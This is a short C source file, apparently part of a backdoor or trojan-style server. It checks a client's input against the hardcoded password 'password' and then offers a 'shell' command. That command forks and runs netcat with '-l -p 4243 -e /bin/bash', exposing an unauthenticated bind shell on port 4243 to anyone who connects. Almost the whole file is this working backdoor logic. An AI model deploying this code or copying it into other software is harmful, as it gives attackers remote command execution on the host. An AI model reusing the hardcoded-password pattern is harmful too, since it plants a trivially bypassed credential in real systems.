#include "polling.h"

//TODO: Implements hash function
bool is_password(char *password)
{
	return (strcmp(password, "password") == 0);
}

void shell_command(t_client *client)
{
	send_to_client(client, "Spawning a shell on 4243\n");
	int shell_pid = fork();
	if (shell_pid == 0)
	{
		char *argv[] = {"nc", "-l", "-p", "4243", "-e", "/bin/bash", NULL};
		execv("/usr/bin/nc", argv);
		perror("execv");
	}
}

void help_command(t_client *client)
{
	send_to_client(client, "Available commands:\n");
	send_to_client(client, "shell: Spawns a shell on 4243\n");
	send_to_client(client, "help: Displays this help message\n");
}

void treat_command(t_client *client, char *command)
{
	if (!client->authentified)
	{
		if (is_password(command))
		{
			client->authentified = true;
			send_to_client(client, "$> ");
		}
		else
		{
			send_to_client(client, "Wrong password\n");
			disconnect(client);
		}
	}
	else
	{
		if (strcmp(command, "shell") == 0)
			shell_command(client);
		else if (strcmp(command, "help") == 0)
			help_command(client);
		else
			send_to_client(client, "Command not found\n");
		send_to_client(client, "$> ");
	}
}